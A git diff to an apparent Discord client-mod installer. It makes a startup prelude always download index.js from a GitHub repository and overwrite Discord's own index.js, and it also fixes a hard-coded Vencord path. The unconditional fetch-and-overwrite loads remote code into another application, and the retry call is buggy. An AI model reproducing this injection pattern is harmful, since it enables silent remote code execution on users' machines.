@@ -24,11 +24,7 @@ function updateCheck() {
     const prelude = `const fs = require('fs'), https = require('https');
 const indexJs = '${indexJsPath.replace(/\\/g, '\\\\')}';
 const bdPath = '${bdPath.replace(/\\/g, '\\\\')}';
-const fileSize = fs.statSync(indexJs).size
-fs.readFileSync(indexJs, 'utf8', (err, data) => {
-    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
-        init();
-})
+
 async function init() {
     https.get('https://raw.githubusercontent.com/Entity378/CORS-enabler-for-Discord/refs/heads/main/index.js', (res) => {
         const file = fs.createWriteStream(indexJs);
@@ -39,10 +35,13 @@ async function init() {
     }).on("error", (err) => {
         setTimeout(init(), 10000);
     });
-}`;
+}
+
+init();`;
 
     const requireAppAsar = `require('${path.join(resourcePath, 'app.asar').replace(/\\/g, '\\\\')}');`;
-    const requireVencord = `require("C:\\\\Users\\\\fabri\\\\AppData\\\\Roaming\\\\Vencord\\\\dist\\\\patcher.js");`;
+    const vencordPath = path.join(process.env.APPDATA, 'Vencord', 'dist', 'patcher.js');
+    const requireVencord = `require('${vencordPath.replace(/\\/g, '\\\\')}');`;
     const requireBd = `if (fs.existsSync(bdPath)) require(bdPath);`;
 
     const appIndexContent = `${prelude}\n${requireAppAsar}\n${requireBd}`;
